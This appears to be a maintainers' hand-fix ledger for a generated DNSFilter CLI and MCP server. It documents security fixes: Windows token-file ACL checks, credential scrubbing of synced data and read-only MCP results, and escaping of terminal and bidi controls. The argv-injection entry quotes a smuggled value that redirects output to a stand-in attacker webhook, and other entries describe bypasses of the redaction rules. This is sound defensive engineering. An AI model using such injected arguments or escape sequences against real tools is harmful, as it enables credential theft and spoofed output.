_comment: Connector-specific edits a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and every banned anti-pattern still absent) and fails CI if a reprint dropped one. Schema and rationale: docs/reprint-survival.md.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.
handfixes.spec_encode_followup: Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site(s); the ledger requires all of them.)
handfixes.why: Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {"domain": "--deliver=webhook:https://attacker/"} became `lists where --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {"domain": "--dry-run"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself. dnsfilter: the precedent_check_before_allowing_a_domain intent (lists where <domain>) is the one guarded call site; the press build pane flagged it as reachable.

handfixes.summary: every resource write scrubs secret-named keys (secret_key, token, client_secret, access_token, payment_token, password, api key, private key, a trailing pin such as uninstall_pin, and the like, at any depth, including inside JSON encoded in a string value) and withholds a string value that still names one as key=value text or a table header, before the row reaches SQLite, its FTS index or a typed table, through one funnel in mergeIncomingResourceData; api-keys is out of the default sync set
handfixes.why:
DNSFilter list and show GETs return live credentials in synced resources: Network.secret_key on /v1/networks, /v1/networks/all, /v1/networks/msp, /v1/networks/msp/all and /v1/networks/{id}, and ApiKey.token on /v1/api_keys and /v1/api_keys/{id} (the full token in an api-keys create response, which the mutation write-through also stores). The generated store wrote them verbatim into the resources blob, resources_fts and the typed tables, so a plain sync left every site's agent secret key in data.db where search, sql and MCP hand it back. ScrubPersistedSecrets (hand-authored internal/store/dnsfilter_secrets.go) decodes each row (UseNumber), drops every secret-named key in nested objects and arrays (booleans and nulls kept; a key whose last word is id/ids/uuid is an identifier, so the revoke rows' api_keys_id parent key survives), returns secret-free rows byte-for-byte and withholds an undecodable row whole. mergeIncomingResourceData is the single place Upsert, every typed Upsert<X>, UpsertBatch (sync) and the live/mutation write-through pass, and its output feeds the generic blob, FTS and the typed projection; scrubbing the merged value also drops a secret a keep-richer merge would carry over from an older row. No novel command reads a scrubbed field. api-keys left the default sync set (nothing local reads it); it stays syncable by name and is still scrubbed. Proven: TestSecretsNeverReachTheStoreFile drives every typed writer by reflection plus UpsertBatch for every typed resource, then greps data.db, -wal and -shm for the sentinel; removing the hook fails it (data.db and data.db-wal), TestMergeDropsALegacySecret and the end-to-end TestSyncNeverPersistsSecrets. A reprint regenerates mergeIncomingResourceData without the hook while every generated test stays green. NOT covered here: the HTTP response cache in internal/client/client.go still writes raw GET bodies (secret_key included) for live list/show commands. Adversarial round 2 (P2): the scrub was narrower than the read-only MCP redactor, which also withholds keys ending in pin and descends into JSON inside string values; read-only MCP sql with a column alias or hex() bypasses the redactor's key-name output filter, so a synced row's uninstall_pin, pin and a string holding {"secret_key":...} reached data.db (LC_ALL=C grep -ao found all three). IsSecretKey now also matches a trailing pin (no DNSFilter spec property ends in pin, so no spec field is newly dropped; pin_code_enabled-style keys are kept), and scrubSecretString decodes a string that is one JSON value (object, array, or a JSON string holding JSON, up to maxNestedJSONDepth levels), scrubs it and re-encodes it compactly, scrubs every JSON object or array embedded in other text, and replaces a string whose remaining text names a secret key with a value (token=..., Uninstall PIN: ..., JSON cut mid-record, or the header row of a multi-line table) with "[withheld: credential]"; past the depth bound a string is only checked as text. Rows with no secret stay byte-identical (internal/client relies on that for its cache gate). Proven: dropping the pin suffix, the string branch or the text rule each fails TestScrubSecretsInsideStrings and TestSecretsNeverReachTheStoreFile, and the first two also fail the end-to-end TestSyncNeverPersistsSecrets. Codex round 2 (P1): duplicate JSON keys bypassed the scrub, because decoding keeps only the last value while the unchanged original bytes were preserved: a UserAgent meta of {"token":"SECRET","token":null} decoded to token:null, so nothing was scrubbed and the row was stored byte-for-byte with SECRET (receipt: LC_ALL=C grep -ao on data-*.db found it). Class fix (a decision on the decoded value must never keep the raw bytes): the byte-identical path is taken only when rawJSONNeedsNoScrub walks the RAW tokens (json.Decoder.Token, every key occurrence) and finds exactly one JSON value with only whitespace after it, no object with a repeated key, no secret-named key with anything but null or a boolean, and no string value scrubSecretString would change; any other row is re-encoded from the scrubbed decoded value (duplicates collapse, secrets drop). The same gate applies at every JSON-in-string level and to every JSON segment embedded in text, and a string that is not exactly one JSON value (text after or around an embedded value) goes through the text rule over the whole string first. TestScrubPersistedSecretsProperty generates 80,000 small documents from four seeds (random nesting, keys from name/token/secret_key/pin/id/meta with duplicates, JSON-in-string, double-encoded and trailing-text variants) whose only sentinels sit under secret keys or in secret name=value text, and fails if any sentinel survives; it fails on the previous code (seed 20261020 case 17, a duplicated token) and on the JSON-in-string gate reverted alone; TestScrubDuplicateKeysAndTrailingText pins the cases, including that a repeated non-secret key is collapsed rather than trusted. Codex round 3 (P1) / adversarial round 5 (P2): the text rule ran secretPairRE on the raw string and never undid JSON escaping, so a string field holding a cut-off (undecodable) JSON blob with a \u-escaped key name persisted the secret (ScrubPersistedSecrets of a meta string {"a":1,"tok\u0065n":"SECRET" returned it unchanged; reproduced end to end through sync and read-only MCP sql substr). textNamesSecret now runs on UnescapeForTextRule(text), which undoes JSON string escaping one level per round up to 6 levels (e in either hex case, ", \, 
, 	, /), the same rule as the read-only MCP redactor's unescapeForTextRule (200,000 random strings gave identical output), so the store scrub is never narrower than MCP output and the redactor can call store.UnescapeForTextRule. The property generator now also spells token/secret_key/pin with \u-escaped characters (upper and lower hex) as document keys, in JSON-in-string, in cut-off blobs (once and twice quoted) and in name=value text; it fails on the previous code (seed 20261020 case 22, a twice-quoted cut-off blob with p\u0069n) and with the unescape call removed. Codex round 4 (P1): the text rule's exemptions matched a prefix, so a value that STARTS with an exempt literal passed: {"meta":"password=true!SENTINEL42"} survived unchanged (null-, false. and "[withheld: credential]secret" likewise, and a value on the next line after an empty separator, YAML-style token:
  SECRET, counted as empty). Every exemption now matches exactly: pairValueEmpty exempts only nothing at all, a delimiter that ends an empty value (, ; & } ] )), or a value token that is exactly true, false, null or the placeholder followed by the end of the text or a delimiter (whitespace , ; & " ' } ] )); newlines after the separator are skipped like spaces, so the next line is read as the value. The rule is exported for the read-only MCP redactor: TextNamesSecret(raw text) undoes JSON escaping and runs the pair and table rules; SecretPairInText(already-unescaped text) is the pair rule alone (no DNSFILTER_ environment-name exception). The property generator now emits values starting with true/false/null/the placeholder and continuing into a sentinel (plain and in cut-off blobs) and next-line values; it fails on the previous code (seed 20261020 case 22, "pin":"true!SNTNL24") and with the literal check back to a bare prefix; TestSecretPairExemptionsAreExact pins both sides. Codex round 5 (P1): quoted values lost their quote boundary before the exemption checks (the separator's trailing quotes were trimmed), so a roaming-client meta of password=",SECRET" read as an empty value and survived into SQLite and read-only MCP. Value extraction is now one tokenizer, pairCarriesValue, and every exemption applies to the value it extracts: spaces and newlines after the separator are skipped; a value opening with a quote (or a quote escaped at that level, ") runs to the matching closing quote with backslash escapes honored, or to the end of the text when unclosed; a closed quoted value followed by anything but the end or a delimiter runs on and carries a value; any other value runs to the first delimiter (the placeholder is matched whole); a value is exempt only when it is exactly empty, true, false, null or the placeholder (quoted content compared with its quotes and surrounding whitespace removed), or an unclosed quote followed only by delimiters (a preview cut right after the separator). TextNamesSecret runs the pair rule on the raw text and on each level of JSON escaping undone, because a quote boundary is only right at the level it was written in (token="",SECRET" is a value at its own level and looks empty once unescaped). The property generator now emits quoted values whose content starts with a delimiter, a literal, the placeholder or an escaped quote, closed or unclosed, plain and in cut-off blobs; it fails on the previous code (seed 20261020 case 19, x password:'null,SNTNL19) and with each tokenizer rule reverted (quotes trimmed again, pair rule only on fully unescaped text, closed quoted value never running on); TestPairValueTokenizer pins both sides. Round 8 (adversarial R7 P1, Codex R6 P1, adversarial R7 P2): (1) the CLI's own auth hints (export DNSFILTER_API_KEY="your-token-here" and the PowerShell twin in helpers.go, auth.go, doctor.go and mcp/tools.go; DNSFILTER_API_KEY=<your-token-here> in client.go; <token>, <value> and <long-random-value> in the README, guide and mcp-install docs) made read-only MCP withhold every 401/403 error block; those five documentation placeholders are now exempt on an exact match of the extracted value only, quoted or not, like WithheldValuePlaceholder (12 CLI/doc strings flip to kept, none flip to withheld). (2) Spaced credential labels were missed ("API Key: SECRET", "Network secret key: SECRET" reached SQLite): the pair regex now captures up to three words before the separator and labelNamesSecret treats the whitespace like _ or -: the last word names a secret, or it is key/keys and the last two or three words together do (API Key, Secret Key, Network secret key; not Password Policy, public key, the key); a header cell of two or three such words heads a secret column when the next non-empty line has the same number of cells. (3) A value on the next line counts only in YAML block form: the next non-empty line is indented deeper than the key's line and is a single token or a quoted string (password:
  hunter2 withheld; Credentials:
  stored in IT Glue, Uninstall PIN:
ask the NOC and Rotate the token:
next quarter kept). Proven: each rule reverted alone fails the extended property test, the pinned cases or TestTextRuleKeepsPlaceholdersAndProse. Round 8 / Codex round 7 (2026-10-20): the round-7 attempt to keep prose after a label that ends its line (judging a next-line value by indent and word count) leaked the common shape of a credential written on the next line ('Uninstall PIN:
482915', 'password:
  correct horse battery staple'); a value that starts on a later line is now judged exactly like a same-line value, so the rule fails closed (prose after a line-ending label is withheld, by design). A spaced secret header (API Key) heads a table when the next non-empty line is a delimited row of any width, since a quoted comma in a CSV row adds cells. TestTextRuleKeepsPlaceholdersAndProse fails on 16 inputs against the previous rule. Codex round 8 / adversarial round 9 (2026-10-20): a value that starts with a delimiter (password=;hunter2) was read as empty; it is now empty only when nothing but delimiters follows (fail closed). The label before a separator is found procedurally (secretLabelBefore): one to three words naming a secret, optionally followed by a qualifier led by a parenthetical, number, comma, dash or preposition (Uninstall PIN for Acme laptops: 4821, Uninstall PIN (Acme): 4821); a following noun is another label (Password Policy: strict is kept), and 'with' is not a qualifier so the CLI's own 'Set your API key with: export ...' hint is judged by its inner placeholder pair. Semicolon tables and 2-5 word headers count. The label window is cut before any scan (the first version searched the whole prefix per separator: 100 s on 1.2 MB; TestTextRuleStaysLinear). Codex round 9 (P1) / adversarial round 10 (P2s), 2026-10-20: the 120-byte label window let 'password for <130 chars>: x' through, the closed qualifier-lead list missed [ – — @ { < and glued #, the window reached across JSON keys ('Office of the Secretary of State','status':... withheld a whole read-only result), and the per-separator window scan was O(120^2). SecretPairInText is now one linear pass with no window: a secret run followed by any punctuation, a digit or a preposition arms the segment, however long the qualifier; a segment ends at a line break or at the end of a JSON string (a quote followed by , } or ]); an exempt value after a labelled separator (<token>, the placeholder) is skipped so its words never arm. TestTextRuleKeepsPlaceholdersAndProse fails on 15 inputs against the windowed rule; TestTextRuleStaysLinear covers 1 MB of '(:' with and without a trailing backslash run. Adversarial round 11 (2 P1s, 2026-10-20): any quote followed by , ] or } ended the segment, so a qualifier listing quoted names ('Admin password for 'Main Office', HQ: x') leaked; and an escaped-looking \n in a UNC path (\\dc01\netlogon) ended it too. Real double quotes (even backslash run) are now tracked as JSON strings and disarm only the qualifier armed inside the string they close; they never arm; escaped double quotes are literal; single quotes are punctuation that arms; an escaped line break is text at its level (the unescape rounds supply real breaks). The table-header check finds the next non-empty line in one backward pass (it was K*M: 34 s on 1 MB). Codex round 10 (P1): an opening double quote after a secret label cleared it without arming (PIN "Acme" (laptops): 482915 leaked); a double quote (or an escaped one, one level down) that opens a string after a space now arms, while a key's quote, which sits against its label, never does. Adversarial round 12 (P1, 2026-10-20): tracking JSON strings in text anyone can write let one stray quote (an inch mark: Rack: 19" cabinet) invert the phase, so a quoted name in a later qualifier disarmed it and the credential was stored. The rule now has two modes. Plain (SecretPairInText, every store value and every string in a result) tracks no strings: an opening quote after a space arms and nothing but a real line break disarms. JSON (SecretPairInJSONText, only the read-only filter's pass over a whole result it decoded) tracks strings at every JSON-in-string nesting level (a quote after 2^d-1 backslashes) and ends a qualifier where the string it armed in closes; the pass over the fully unescaped result is label-only (SecretLabelPairInText), since unescaping destroys the quote structure. A string value that starts like JSON but is not one value (a bounded preview) skips the whole-string plain pass: its complete records are redacted as JSON and the remainder keeps the plain rule, so ordinary records no longer withhold a preview. A 8100-case fuzz (6 prefixes incl. stray quotes x 6 labels x 15 qualifiers x 3 separators, plain/result/preview/mixed) through redact.Final and the store scrub found no miss.

handfixes.summary: the --full / --latest-only cursor clears go through store.ClearSyncCursor, which marks the attempt incomplete (never complete), and run only after every flag is validated, only for known resource names, and only for resources that will get past syncResource's preflight
handfixes.why: The generated sync cleared each selected collection with SaveSyncStateAt(resource, "", 0, time.Time{}), which writes last_attempt_complete = 1, and did it before --since was parsed. So `sync --full --since bogus` rewrote every row to complete and exited; a kill, timeout or MCP-host SIGTERM during a --full run left every queued, never-walked collection reading complete; and `--full --resources netwrks` left a row for a name that can never sync. mcpStoreStatus (internal/mcp/tools.go) counts last_attempt_complete to tell agents the store is a complete snapshot, so all three read as ready (false-GREEN). ClearSyncCursor (hand-authored internal/store/dnsfilter_sync_state.go) resets cursor, watermark (NULL) and count and writes last_attempt_complete = 0; only the walk's final SaveSyncStateAt after outcome.complete marks a collection complete. The clear now runs after --since parsing, skips names not in knownSyncResourceNames(), and skips a resource syncResourceWalksAfterClear says the walk will skip (domains without fqdns), because a cleared row only becomes complete again through a walk. Precedent: backup-radar sync-clear-never-marks-complete. Proven: SaveSyncStateAt back at the clear site fails TestSyncFullClearLeavesQueuedCollectionIncomplete (users read complete=1 while networks was still in flight); the original pre-validation clear fails TestSyncUsageErrorsLeaveSyncStateUntouched and TestSyncFullDoesNotClearAResourceItWillSkip; dropping the known-name filter or the preflight filter fails the matching test; ClearSyncCursor writing 1 fails TestClearSyncCursorNeverMarksComplete. NOT covered here: internal/cli/channel_workflow.go (workflow archive --full) still clears with s.SaveSyncState(resource, "", 0), which stamps now with complete = 1. workflow archive --full had its own copy of the old clear (SaveSyncState(resource, "", 0) stamps complete=1) and its own hard-coded resource list that still included api-keys; it now uses ClearSyncCursor, the syncResourceWalksAfterClear filter and defaultSyncResources(). TestWorkflowArchiveFullClearNeverMarksComplete times the archive out on its first resource and fails if any never-walked collection reads complete or api-keys gets a sync_state row.

handfixes.summary: mergeKeepRicherArray treats an explicit empty array as authoritative when the stored array holds scalars (a cleared allow/block list or category set), and keeps the richer stored copy only for object arrays
handfixes.why: The generated keep-richer merge returned the existing array whenever the incoming one was empty, so a policy whose whitelist_domains or blacklist_categories was cleared in DNSFilter kept the old entries in the mirror forever, and lists where / why-blocked reported a domain as still allowed or blocked. Made by the factory build pane. Proven: restoring the generator's `return existing` fails TestMergeClearedScalarListIsAuthoritative (internal/store/dnsfilter_merge_test.go).

handfixes.summary: mergeKeepRicherObject replaces each JSON:API relationship the incoming row supplies (a cleared data: null or [] replaces the stored one) while keeping omitted sibling relationships, and an explicit null timestamp (any *_at key, last_sync) clears the stored value
handfixes.why: The generated merge recursed into relationships with keep-richer rules, so a relationship cleared in DNSFilter (a site moved off its policy, data: null; a policies list emptied, data: []) kept the stale link, and an explicit null uninstalled_at / last_sync kept the old timestamp; agents stale and lists where then joined clients to the wrong policy or site and counted uninstalled clients. Note: it is per-relationship replacement, not a wholesale replace of the relationships object (omitted siblings are deliberately kept). Made by the factory build pane. Proven: removing the relationships block fails TestMergePartialRelationshipsKeepSiblings and TestMergeClearedRelationshipsAreAuthoritative; removing the null-timestamp branch fails TestMergeExplicitNullTimestampClears (internal/store/dnsfilter_merge_test.go). Generalized 2026-10-20 (merge-explicit-empty-scalar-is-authoritative): every scalar null or "" now clears, not only timestamps.

handfixes.summary: the MCP server's --transport http bearer token is read through cliutil.EnvOverride, so an unresolved ${user_config.dnsfilter_mcp_http_token} placeholder is refused instead of becoming the secret
handfixes.why: The generated requireHTTPCallerToken read DNSFILTER_MCP_HTTP_TOKEN with os.Getenv. The variable is being declared as an optional MCPB user_config value, and a host that skips an optional prompt leaves the literal placeholder text in the environment; that text is public (it is in manifest.json), so anyone could authenticate to an HTTP-mode server started that way. Same fix as sophos-central, bitdefender and backup-radar. TestHTTPTokenPlaceholderRefused fails when the read goes back to os.Getenv (proven 2026-10-20) and passes with EnvOverride.
handfixes.spec_encode_followup: Press-side: main_mcp.go.tmpl should read the HTTP token through cliutil.EnvOverride for every connector.

handfixes.summary: the precedent_check_before_allowing_a_domain intent is annotated readOnlyHint=true, destructiveHint=false (it runs `lists where --agent`, a local read), and under DNSFILTER_MCP_READ_ONLY dnsfilter_execute is registered with readOnlyHint=true, destructiveHint=false
handfixes.why: The generated intent set only OpenWorldHint, so mcp-go's defaults advertised a local read as readOnlyHint=false, destructiveHint=true; it stays listed in read-only mode, so a read-only server advertised a 'destructive' tool and hosts that honor hints prompted on every precedent check. dnsfilter_execute had no annotations at all, so it advertised destructive even in read-only mode, where its handler only runs GETs that return no credential. Default mode keeps execute destructive (it can DELETE). TestReadOnlyToolHints fails when either the intent annotations or the read-only execute hint are removed (each proven separately 2026-10-20).

handfixes.summary: every MCP tool result and handler error (typed tools, code orchestration, intents and every Cobra-mirror shell-out) passes one server middleware that rewrites C0 controls (except tab and newline), a bare CR, DEL, C1 controls and the bidi embedding/override/isolate controls (U+202A-U+202E, U+2066-U+2069) as \uXXXX before the text leaves the server
handfixes.why: Tenant strings (organization, site, policy and agent names, notes, block-page text) reached content[].text verbatim from API JSON, the local store and the companion CLI's stdout, so a name carrying U+009D ... U+009C (an OSC 52 clipboard write) or ESC[8m reached a host that prints results to a terminal. Ported from backup-radar's escaping constructors, but installed as the outermost mcp-go middleware (installResultSafety, first line of RegisterTools) so a tool added by any later registrar and a Go error returned by any handler are covered without per-call-site discipline. The escape is lossless inside JSON strings. TestResultFunnelEscapesEveryTool drives probe tools through the real JSON-RPC dispatch and fails when installResultSafety is removed or when safeResultText stops escaping (both proven 2026-10-20). Round 2 adversarial (2026-10-20, P2): bidi override/isolate controls in tenant names reached results unchanged, a Trojan-Source-style display spoof in why_blocked / allow previews; they are now escaped at the same boundary (\u202e etc.), losslessly inside JSON. TestEscapeBidiControls fails when isBidiControl is dropped from isTerminalControl.
handfixes.spec_encode_followup: Press-side: the generated RegisterTools should install a result-escaping middleware.

handfixes.summary: with DNSFILTER_MCP_READ_ONLY=1 no MCP tool returns a credential: dnsfilter_execute refuses the api-keys reads, every network secret_key endpoint, the roaming client uninstall PIN and the GET that creates a PSA integration (keyed on the registered path template); the Cobra mirror skips or refuses any command or resource argument naming those paths (tail api-keys); and the result funnel (internal/mcp/redact.Final, called by the middleware in result_safety.go) replaces the value of every credential-named field (store.IsSecretKey, which now includes a trailing pin) at any depth of every JSON value in a result, withholds plain text that names one as a CSV/table header or key=value pair, and withholds any text carrying a value it already withheld
handfixes.why: DNSFilter GETs return live credentials: ApiKey.token (/v1/api_keys, /v1/api_keys/{id}), Network.secret_key (the site deployment secret, in every networks list and show), the organization's uninstall PIN (/v1/user_agents/uninstall_pin, annotated mcp:read-only), and EnterpriseConnection options.client_secret. The generated read-only switch only refused non-GET execute calls, so a read-only agent could read all of them through dnsfilter_execute, and `tail api-keys` / `tail networks` printed them through the mirror. GET /v1/psa_integrations/redirect_link creates an integration, a write behind a GET. Networks reads stay available with secret_key replaced by '[withheld: credential]' so a read-only agent still sees site names and ids. Proven over stdio 2026-10-20 against a mock returning secret_key SENTINEL-NET-SECRET: in read-only mode no tools/call result (execute networks.index/all/show, tail networks, sql, search, context) carried the sentinel, the api-keys reads, the uninstall PIN and tail api-keys were refused with zero requests reaching the mock. handfixes.summary: under DNSFILTER_MCP_READ_ONLY every internal/mcp/bound entry point (EndpointResponse, EndpointPageResponse, JSON, Text) redacts credential-named fields on the FULL body before any list bounding, truncation or raw-byte preview, and the result funnel fails closed on what it cannot decode: a string value (a bounded preview cut mid-record, CSV, escaped JSON) that still names a credential field with a value is replaced whole, tolerating a value cut at the truncation point
handfixes.why: Adversarial round 1 (2026-10-20, P1): a read-only GET over the 60000-byte budget whose object has more than one top-level array (DNSFilter networks lists carry data plus included) fell back to bound.previewEnvelope, a JSON string holding the first 4000 raw bytes of the body; bound.Text does the same for any mirrored stdout over budget. The funnel decoded the outer envelope, but the preview value began with '{' and never decoded (truncated), so it passed unredacted: dnsfilter_execute networks.index page[size]=100 returned {"_pp_truncated":true,"original_bytes":105597,...,"preview":"{\"data\": [{... \"secret_key\": \"NETSECRET-...". Now bound redacts first (one choke point for endpoint execute, the Cobra-mirror stdout/stderr and error text, tail NDJSON, and the sql/search envelopes), and Text keeps its budget decision on the unredacted length so a capped stdout that redaction shrank still ends up as a preview without its cut tail record. The funnel backstop (redact.Final) redacts the complete records inside an undecodable string, then replaces the string if a credential field with a value (not the placeholder, not true/false/null) remains, matching keys behind escaped quotes too. Proven over stdio 2026-10-20 against a 122894-byte networks body (200 sites, unique secret_key, plus included[]) and a pre-scrub store: with read-only on, execute networks.index/all/msp/msp-all, tail networks, sql and search each returned a bounded result with site names and no NETSECRET; with read-only off the same calls returned the raw preview with NETSECRET (the path is real). Revert proofs: removing the Raw call in endpointResponse, Text or JSON, moving Text's budget decision to the redacted length, removing the undecodable-string backstop, the escaped-quote tolerance or the placeholder/literal exemption each fails TestBoundingRedactsBeforePreview, TestReadOnlyOversized*NeverLeaksSecrets or TestFinalWithholdsUndecodablePreview. The placeholder constants were renamed (WithheldFieldPlaceholder, WithheldBlockMessage) so gosec G101 no longer flags them. Round 7 (2026-10-20): the key=value scan, the value exemptions and the escaped-quote handling moved to the store's text rule (store.SecretPairInText / store.TextNamesSecret, see mcp-redact-exact-literal-exemptions); the bounding asserts are unchanged.

handfixes.summary: sync marks a collection complete (last_attempt_complete = 1, watermark advanced) only after a whole, unfiltered walk: a walk narrowed by --param / --global-param / --resource-param, cut by --max-pages, resumed from a saved cursor, or fetching an incremental window the stored watermark does not cover records incomplete, keeps the prior watermark and never prunes; a narrowed walk also never writes its cursor into the resource-wide resume state; dependents are complete only under a complete parent collection
handfixes.why: Codex P1: filtered syncs counted as complete fleet snapshots. On a fresh mirror, `sync --resources organizations,networks,user-agents --resource-param user-agents:organization_id=1` marked user-agents complete, so `agents stale` (incompleteCollections in dnsfilter_common.go trusts last_attempt_complete) printed an all-clear while silently omitting org 2's unprotected clients (receipt: HEAD build returned results [] with no incomplete_collections). The generated syncResource set last_attempt_complete = 1 on any natural end of pagination, whatever narrowed the request. The same gap let `sync --full --resource-param ...` and `sync --full --since 7d` prune every row outside the filter or window (ReconcileAll trusts the same outcome.complete). Rule now: outcome.complete is downgraded (param_scoped, resumed_from_cursor, incremental_window) before both the prune decision and the final save, and the watermark only moves with a complete walk, so a watermark always means 'complete as of then'. An incremental walk (explicit --since or the default resume from the watermark) is complete only when its window starts at or before that watermark (syncSinceCoveredByWatermark): a fresh mirror plus --since 7d stays incomplete and sets no watermark, a plain repeated sync stays complete, and --since starting after the watermark leaves a gap and records incomplete. --full clears and walks everything, so it restores complete after a narrowed walk. A capped walk was already incomplete (outcome.complete false on a cap with a continuation); a --latest-only walk of a collection that fits its single page is a whole unfiltered walk and stays complete, a capped one does not. Dependent walks narrowed by --global-param / --resource-param or a --since window are incomplete per parent, and a dependent collection is complete only when its parent collection is (parent_collection_incomplete). Proven: each rule reverted alone fails its test (params never scoping fails TestSyncCompleteMeansWholeFleet, TestSyncNarrowedFullWalkNeverPrunes and TestSyncDependentsNeedACompleteParent; resumed counted fails TestSyncResumedWalkIsIncomplete; any window covered fails TestSyncIncrementalCompletion, TestSyncSinceCoveredByWatermark and TestSyncFullSinceNeverPrunes; the parent check or the per-parent downgrade removed fails TestSyncDependentsNeedACompleteParent).

handfixes.summary: a flat sync walk that is not a complete snapshot never reports (done) or sync_complete: a truncated walk (resumed cursor, --max-pages cap, stuck or unavailable cursor) warns with the --full remedy; a walk scoped by --param or --since succeeds but says complete=false
handfixes.why: After sync-complete-means-whole-fleet, a walk resumed from a saved cursor records the collection incomplete (it saw only the pages after the cursor), but the run still printed `<name>: N synced (done)` and emitted sync_complete with no hint, so an operator or agent read a complete collection. The resumed walk now returns a warning result with the remedy: JSON mode emits {"event":"sync_warning","reason":"resumed_from_cursor",...} and no sync_complete for that resource, human mode prints `<name>: warning: walk resumed from a saved cursor, so the collection is not complete yet; run 'dnsfilter-cli sync --full --resources <name>' to complete it`.
